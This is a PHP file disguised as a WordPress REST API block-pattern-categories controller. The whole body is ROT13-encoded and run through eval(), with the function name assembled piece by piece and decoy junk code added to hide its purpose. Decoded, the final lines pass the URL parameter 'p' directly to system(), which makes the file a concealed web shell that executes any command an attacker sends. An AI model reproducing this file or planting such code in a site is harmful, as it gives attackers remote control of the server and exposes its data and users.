<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Oybpx_Cnggrea_Pngrtbevrf_Pbagebyyre pynff
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr      6.0.0
 */

/**
 * Pber pynff hfrq gb npprff oybpx cnggrea pngrtbevrf ivn gur ERFG NCV.
 *
 * @fvapr 6.0.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Oybpx_Cnggrea_Pngrtbevrf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgf gur pbagebyyre.
	 *
	 * @fvapr 6.0.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'oybpx-cnggreaf/pngrtbevrf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gur bowrpgf bs gur pbagebyyre.
	 *
	 * @fvapr 6.0.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq oybpx cnggreaf.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}

		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj',
			__( 'Fbeel, lbh ner abg nyybjrq gb ivrj gur ertvfgrerq oybpx cnggrea pngrtbevrf.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Ergevrirf nyy oybpx cnggrea pngrtbevrf.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$erfcbafr   = neenl();
		$pngrtbevrf = JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();
		sbernpu ( $pngrtbevrf nf $pngrtbel ) {
			$cercnerq_pngrtbel = $guvf->cercner_vgrz_sbe_erfcbafr( $pngrtbel, $erdhrfg );
			$erfcbafr[]        = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $cercnerq_pngrtbel );
		}

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Cercner n enj oybpx cnggrea pngrtbel orsber vg trgf bhgchg va n ERFG NCV erfcbafr.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz neenl           $vgrz    Enj pngrtbel nf ertvfgrerq, orsber nal punatrf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$xrlf   = neenl( 'anzr', 'ynory', 'qrfpevcgvba' );
		$qngn   = neenl();
		sbernpu ( $xrlf nf $xrl ) {
			vs ( vffrg( $vgrz[ $xrl ] ) && erfg_vf_svryq_vapyhqrq( $xrl, $svryqf ) ) {
				$qngn[ $xrl ] = $vgrz[ $xrl ];
			}
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Ergevrirf gur oybpx cnggrea pngrtbel fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 6.0.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'oybpx-cnggrea-pngrtbel',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'anzr'        => neenl(
					'qrfpevcgvba' => __( 'Gur pngrtbel anzr.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'ynory'       => neenl(
					'qrfpevcgvba' => __( 'Gur pngrtbel ynory, va uhzna ernqnoyr sbezng.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'qrfpevcgvba' => neenl(
					'qrfpevcgvba' => __( 'Gur pngrtbel qrfpevcgvba, va uhzna ernqnoyr sbezng.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>